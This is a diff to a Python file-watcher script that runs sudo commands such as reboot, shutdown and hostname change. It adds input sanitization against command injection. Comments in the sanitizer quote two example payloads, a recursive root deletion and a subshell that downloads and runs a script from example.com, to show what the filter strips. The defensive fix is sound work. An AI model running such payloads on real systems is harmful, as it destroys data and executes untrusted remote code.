@@ -6,7 +6,7 @@ import logging
 from watchdog.observers import Observer
 from watchdog.events import LoggingEventHandler, PatternMatchingEventHandler
 from logging.handlers import RotatingFileHandler
-
+import re
 
 LOGFILE = "/home/ceadmin/RTA/logs/commlog.txt"
 STATUSDIR = "/dev/piCOMM/"
@@ -25,7 +25,7 @@ commands = {
         "default": "echo 0",
         "change-to": "1",  # "any" is reserved, means read the file, monitor for changes from last value, then $any$ can be used to replace in cmd
         "cmd": "sudo shutdown -r 0",
-        "response": 'echo "shutting down now"',  # command to generate response or ''
+        "response": 'echo "restarting now"',  # command to generate response or ''
         "response-index": 0,  # index of output of command to send as a response if "response" is ''
     },
     "update": {
@@ -40,6 +40,13 @@ commands = {
         "change-to": "any",
         "cmd": "sudo hostnamectl hostname $any$",
         "response": "sudo hostnamectl hostname",
+        "response-index": 0,
+    },
+    "shutdown": {
+        "default": "echo 0",
+        "change-to": "1",
+        "cmd": "sudo shutdown 0",
+        "response": 'echo "shutting down now"',
         "response-index": 0,
     },
 }
@@ -224,9 +231,16 @@ def start_watchdog(logger):
                                 response = execcmd(commands[cmdname]["cmd"])
                         else:  # val change-to is any then
                             self.line = 17
-                            command = commands[cmdname]["cmd"].replace(
-                                "$any$", str(val)
-                            )
+                            # sanitize user input before executing it in bash
+                            # goal: allow only alphanumeric and spaces, and convert spaces to underscores
+                            clean = str(val).replace("_", "")
+                            clean = clean.replace(" ", "_")
+                            clean = re.sub("[^a-zA-Z0-9_]", "", clean)
+                            clean = f'"{clean}"'
+                            # ";rm -rf /*" ->'"rm_rf_"'
+                            # ";$(wget example.com/malicious_script.sh; chmod +777 malicious_script.sh; ./malicious_script.sh)"->
+                            # '"wget_examplecommaliciousscriptsh_chmod_777_maliciousscriptsh_maliciousscriptsh"'
+                            command = commands[cmdname]["cmd"].replace("$any$", clean)
                             self.line = 18
                             logger.info(
                                 f"'{val}'  written to {os.path.join(STATUSDIR,cmdname)}, executing {command}"
